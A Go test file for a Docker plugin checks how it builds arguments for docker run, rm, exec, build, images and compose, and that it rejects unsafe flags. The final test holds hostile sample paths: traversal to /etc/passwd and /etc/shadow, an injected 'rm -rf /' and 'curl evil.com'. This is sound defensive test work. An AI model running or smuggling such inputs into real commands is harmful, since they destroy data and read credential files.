package main_test

import (
	"reflect"
	"strings"
	"testing"

	main "github.com/jameswlane/devex/packages/package-manager-docker"
)

func TestBuildDockerRunArgsFromTemplateInstallFlags(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, err := plugin.BuildDockerRunArgs([]string{
		"postgres:16",
		"--name=devex-postgres",
		"--port=127.0.0.1:5432:5432",
		"--env=POSTGRES_HOST_AUTH_METHOD=trust",
		"--volume=pgdata:/var/lib/postgresql/data",
		"--restart=unless-stopped",
		"--detach",
	})
	if err != nil {
		t.Fatalf("BuildDockerRunArgs returned error: %v", err)
	}

	expected := []string{
		"run",
		"-d",
		"--name", "devex-postgres",
		"-p", "127.0.0.1:5432:5432",
		"-e", "POSTGRES_HOST_AUTH_METHOD=trust",
		"-v", "pgdata:/var/lib/postgresql/data",
		"--restart", "unless-stopped",
		"postgres:16",
	}
	if !reflect.DeepEqual(args, expected) {
		t.Fatalf("unexpected args:\nwant: %#v\n got: %#v", expected, args)
	}
}

func TestBuildDockerRunArgsSupportsSpaceSeparatedFlags(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, err := plugin.BuildDockerRunArgs([]string{
		"redis:7",
		"--name", "devex-redis",
		"-p", "127.0.0.1:6379:6379",
	})
	if err != nil {
		t.Fatalf("BuildDockerRunArgs returned error: %v", err)
	}

	expected := []string{"run", "-d", "--name", "devex-redis", "-p", "127.0.0.1:6379:6379", "redis:7"}
	if !reflect.DeepEqual(args, expected) {
		t.Fatalf("unexpected args:\nwant: %#v\n got: %#v", expected, args)
	}
}

func TestBuildDockerRunArgsRejectsUnsupportedInstallFlags(t *testing.T) {
	plugin := main.NewDockerPlugin()

	_, err := plugin.BuildDockerRunArgs([]string{"redis:7", "--privileged"})
	if err == nil || !strings.Contains(err.Error(), "unsupported docker install flag") {
		t.Fatalf("expected unsupported flag error, got %v", err)
	}
}

func TestBuildDockerRemoveArgsKeepsFlagsSeparateFromContainerNames(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, containers, err := plugin.BuildDockerRemoveArgs([]string{
		"devex-postgres",
		"--volumes",
		"--force",
	})
	if err != nil {
		t.Fatalf("BuildDockerRemoveArgs returned error: %v", err)
	}

	expectedArgs := []string{"rm", "-v", "-f", "devex-postgres"}
	if !reflect.DeepEqual(args, expectedArgs) {
		t.Fatalf("unexpected remove args:\nwant: %#v\n got: %#v", expectedArgs, args)
	}
	expectedContainers := []string{"devex-postgres"}
	if !reflect.DeepEqual(containers, expectedContainers) {
		t.Fatalf("unexpected containers:\nwant: %#v\n got: %#v", expectedContainers, containers)
	}
}

func TestBuildDockerRemoveArgsDeduplicatesFlags(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, containers, err := plugin.BuildDockerRemoveArgs([]string{
		"devex-postgres",
		"--volumes",
		"-v",
		"--force",
		"-f",
	})
	if err != nil {
		t.Fatalf("BuildDockerRemoveArgs returned error: %v", err)
	}

	expectedArgs := []string{"rm", "-v", "-f", "devex-postgres"}
	if !reflect.DeepEqual(args, expectedArgs) {
		t.Fatalf("unexpected remove args:\nwant: %#v\n got: %#v", expectedArgs, args)
	}
	expectedContainers := []string{"devex-postgres"}
	if !reflect.DeepEqual(containers, expectedContainers) {
		t.Fatalf("unexpected containers:\nwant: %#v\n got: %#v", expectedContainers, containers)
	}
}

func TestBuildDockerExecArgsAvoidsTTYInNonInteractiveOutput(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, err := plugin.BuildDockerExecArgs([]string{"devex-postgres", "psql", "-U", "postgres"})
	if err != nil {
		t.Fatalf("BuildDockerExecArgs returned error: %v", err)
	}

	if !reflect.DeepEqual(args[:2], []string{"exec", "-i"}) {
		t.Fatalf("unexpected exec prefix:\nwant: %#v\n got: %#v", []string{"exec", "-i"}, args[:2])
	}
	if contains(args, "-it") {
		t.Fatalf("exec args should not include hardcoded -it: %#v", args)
	}
}

func TestBuildDockerStatusArgsForContainerInspection(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, err := plugin.BuildDockerStatusArgs([]string{"devex-postgres"})
	if err != nil {
		t.Fatalf("BuildDockerStatusArgs returned error: %v", err)
	}

	expected := []string{"inspect", "--format={{.Name}} {{.State.Status}}", "devex-postgres"}
	if !reflect.DeepEqual(args, expected) {
		t.Fatalf("unexpected status args:\nwant: %#v\n got: %#v", expected, args)
	}
}

func TestBuildDockerRestartArgsForContainer(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, err := plugin.BuildDockerRestartArgs([]string{"devex-postgres"})
	if err != nil {
		t.Fatalf("BuildDockerRestartArgs returned error: %v", err)
	}

	expected := []string{"restart", "devex-postgres"}
	if !reflect.DeepEqual(args, expected) {
		t.Fatalf("unexpected restart args:\nwant: %#v\n got: %#v", expected, args)
	}
}

func TestBuildDockerPullArgsForImage(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, err := plugin.BuildDockerPullArgs([]string{"postgres:16"})
	if err != nil {
		t.Fatalf("BuildDockerPullArgs returned error: %v", err)
	}

	expected := []string{"pull", "postgres:16"}
	if !reflect.DeepEqual(args, expected) {
		t.Fatalf("unexpected pull args:\nwant: %#v\n got: %#v", expected, args)
	}
}

func TestBuildDockerBuildArgsAllowsKnownSafeFlags(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, err := plugin.BuildDockerBuildArgs([]string{
		"--tag=devex-app:latest",
		"--file",
		"Dockerfile.prod",
		"--build-arg",
		"APP_ENV=production",
		"--no-cache",
		".",
	})
	if err != nil {
		t.Fatalf("BuildDockerBuildArgs returned error: %v", err)
	}

	expected := []string{
		"build",
		"-t", "devex-app:latest",
		"-f", "Dockerfile.prod",
		"--build-arg", "APP_ENV=production",
		"--no-cache",
		".",
	}
	if !reflect.DeepEqual(args, expected) {
		t.Fatalf("unexpected build args:\nwant: %#v\n got: %#v", expected, args)
	}
}

func TestBuildDockerBuildArgsRejectsUnsupportedFlags(t *testing.T) {
	plugin := main.NewDockerPlugin()

	_, err := plugin.BuildDockerBuildArgs([]string{"--output", "type=local,dest=/sensitive/path", "."})
	if err == nil || !strings.Contains(err.Error(), "unsupported docker build flag") {
		t.Fatalf("expected unsupported build flag error, got %v", err)
	}
}

func TestBuildDockerImagesArgsPassesValidatedFilters(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, err := plugin.BuildDockerImagesArgs([]string{
		"--filter",
		"dangling=true",
		"postgres:*",
	})
	if err != nil {
		t.Fatalf("BuildDockerImagesArgs returned error: %v", err)
	}

	expected := []string{"images", "-f", "dangling=true", "postgres:*"}
	if !reflect.DeepEqual(args, expected) {
		t.Fatalf("unexpected images args:\nwant: %#v\n got: %#v", expected, args)
	}
}

func TestBuildDockerImagesArgsRejectsUnsupportedFlags(t *testing.T) {
	plugin := main.NewDockerPlugin()

	_, err := plugin.BuildDockerImagesArgs([]string{"--output=json"})
	if err == nil || !strings.Contains(err.Error(), "unsupported docker images flag") {
		t.Fatalf("expected unsupported images flag error, got %v", err)
	}
}

func TestBuildDockerComposeArgsNormalizesGlobalFlags(t *testing.T) {
	plugin := main.NewDockerPlugin()

	args, err := plugin.BuildDockerComposeArgs([]string{
		"up",
		"--file=compose.yaml",
		"--project=devex-stack",
		"--detach",
	})
	if err != nil {
		t.Fatalf("BuildDockerComposeArgs returned error: %v", err)
	}

	expected := []string{
		"compose",
		"-f", "compose.yaml",
		"-p", "devex-stack",
		"up",
		"-d",
	}
	if !reflect.DeepEqual(args, expected) {
		t.Fatalf("unexpected compose args:\nwant: %#v\n got: %#v", expected, args)
	}
}

func contains(values []string, value string) bool {
	for _, item := range values {
		if item == value {
			return true
		}
	}
	return false
}

func TestBuildDockerComposeArgsRejectsUnsafeComposeFiles(t *testing.T) {
	plugin := main.NewDockerPlugin()

	unsafePaths := []string{
		"",
		"../../../etc/passwd",
		"/etc/shadow",
		"path; rm -rf /",
		"path && curl evil.com",
	}
	for _, path := range unsafePaths {
		_, err := plugin.BuildDockerComposeArgs([]string{"up", "--file=" + path})
		if err == nil || !strings.Contains(err.Error(), "invalid compose file path") {
			t.Fatalf("expected invalid compose file path for %q, got %v", path, err)
		}
	}
}
